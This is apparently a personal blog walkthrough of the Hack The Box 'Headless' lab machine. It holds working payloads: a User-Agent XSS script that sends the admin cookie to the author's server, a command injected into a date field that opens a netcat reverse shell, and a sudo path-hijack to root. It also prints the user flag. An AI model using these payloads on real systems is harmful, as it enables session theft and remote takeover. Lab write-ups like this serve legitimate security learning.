---
title: "Headless from HTB"
categories: [Hack The Box]
tags: [Hack The Box]
---
# Headless from HTB
[page](https://app.hackthebox.com/machines/Headless)
`Nmap`gave this:
```bash
$ nmap -sCV --min-rate 4000 -p- 10.10.11.8
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-07 23:00 +04
Warning: 10.10.11.8 giving up on port because retransmission cap hit (10).
Stats: 0:00:13 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 26.55% done; ETC: 23:01 (0:00:36 remaining)
Nmap scan report for 10.10.11.8
Host is up (0.089s latency).
Not shown: 57469 closed tcp ports (conn-refused), 8065 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey:
|   256 90:02:94:28:3d:ab:22:74:df:0e:a3:b2:0f:2b:c6:17 (ECDSA)
|_  256 2e:b9:08:24:02:1b:60:94:60:b3:84:a9:9e:1a:60:ca (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Nothing unusual.
I went to the site and it displayed time and after that site will be live. We'll `imma say i ain't waitin allat`(trash `ahh` joke) And started exploiting. There is `/support`directory, which allows me to send message. I tried `XSS`by typing
```
<script>alert(1)</script>
```
In comment section.
![](/assets/images/Screenshot from 2024-08-07 23-35-52.png)
I was caught doing that.
But what if i tried `Intercepting`with `BurpSuite`? Will it work?  Yeah it will work.
I'm tired of typing this `Walktroughs`so i'm gonna go straight to point:
```python
python3 -m http.server 8000 # start simple server
```
Then modify `BurpSuite`like this while intercept is on:
```
POST /support HTTP/1.1
Host: 10.10.11.8:5000
Content-Length: 98
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.10.11.8:5000
Content-Type: application/x-www-form-urlencoded
User-Agent: <script>var i=new Image(); i.src="http://10.10.16.3:8000/?cookie="+btoa(document.cookie);</script>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Sec-GPC: 1
Accept-Language: en-US,en
Referer: http://10.10.11.8:5000/support
Accept-Encoding: gzip, deflate, br
Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs
Connection: keep-alive

fname=aa&lname=bb&email=test%40test.com&phone=1231&message=%3Cscript%3Ealert%281%29%3C%2Fscript%3E
```
If you'r lazy to read here is modified thing:
```bash
User-Agent: <script>var i=new Image(); i.src="http://10.10.16.3:8000/?cookie="+btoa(document.cookie);</script>
```
This will show me `admin cookie`in my python server.
Forward that and wait for second cookie:
```python
python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.16.3 - - [07/Aug/2024 23:15:49] "GET /?cookie=aXNfYWRtaW49SW5WelpYSWkudUFsbVhsVHZtOHZ5aWhqTmFQRFdudkJfWmZz HTTP/1.1" 200 -
10.10.11.8 - - [07/Aug/2024 23:16:26] "GET /?cookie=aXNfYWRtaW49SW1Ga2JXbHVJZy5kbXpEa1pORW02Q0swb3lMMWZiTS1TblhwSDA= HTTP/1.1" 200 -
```
This is the `admin cookie`encoded with `base64`. Decode it:
```bash
$ echo "aXNfYWRtaW49SW5WelpYSWkudUFsbVhsVHZtOHZ5aWhqTmFQRFdudkJfWmZz" | base64 -d^C
$ echo "aXNfYWRtaW49SW1Ga2JXbHVJZy5kbXpEa1pORW02Q0swb3lMMWZiTS1TblhwSDA=" | base64 -d
is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0
```
`is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0`
Go to site and in `inspect > application > cookies`modify the `is_admin`cookie with this:
`ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0`.
After that use  `gobuster dir` for directory searching and you will find `dashboard`. With cookie already modified click `Generate report`and with `BurpSuite Intercept on` Add the `NetCat`script:
```
date=2023-09-15;nc+10.10.16.3+1234+-e+/bin/bash
```
This will give me connection on `nc -nlvp 1234`:
```bash
$ nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.10.16.3] from (UNKNOWN) [10.10.11.8] 36136
script /dev/null -c bash
Script started, output log file is '/dev/null'.
dvir@headless:~/app$ cat /home/dvir/user.txt
c03dcd735ec55ef102130cbf0336ef6a
```
***
User Flag is : c03dcd735ec55ef102130cbf0336ef6a
***
`Sudo -l`tells me that i can run `/usr/bin/syscheck`with `root`permission and i can also read it;
```bash
#!/bin/bash

if [ "$EUID" -ne 0 ]; then
  exit 1
fi

last_modified_time=$(/usr/bin/find /boot -name 'vmlinuz*' -exec stat -c %Y {} + | /usr/bin/sort -n | /usr/bin/tail -n 1)
formatted_time=$(/usr/bin/date -d "@$last_modified_time" +"%d/%m/%Y %H:%M")
/usr/bin/echo "Last Kernel Modification Time: $formatted_time"

disk_space=$(/usr/bin/df -h / | /usr/bin/awk 'NR==2 {print $4}')
/usr/bin/echo "Available disk space: $disk_space"

load_average=$(/usr/bin/uptime | /usr/bin/awk -F'load average:' '{print $2}')
/usr/bin/echo "System load average: $load_average"

if ! /usr/bin/pgrep -x "initdb.sh" &>/dev/null; then
  /usr/bin/echo "Database service is not running. Starting it..."
  ./initdb.sh 2>/dev/null
else
  /usr/bin/echo "Database service is running."
fi

exit 0
```
In this code all we need is the last line of codes.
```bash
if ! /usr/bin/pgrep -x "initdb.sh" &>/dev/null; then
  /usr/bin/echo "Database service is not running. Starting it..."
  ./initdb.sh 2>/dev/null
else
  /usr/bin/echo "Database service is running."
fi
```
This check if some database named `initdb.sh`is running and if not it starts it in the same directory. `./ means in to run some file in current directory`
Do this:
```bash
nano initdb.sh
#!/bin/bash
/bin/bash
```
Then make it executable
```bash
chmod +x initdb.sh
```
And then execute the code.
```bash
sudo /usr/bin/syscheck
```
This will start interactive `bash`shell where you will be `root`and can read the flag.
***
Root Flag is : I deleted It :D
***
![](/assets/images/Screenshot from 2024-08-07 23-28-22.png)
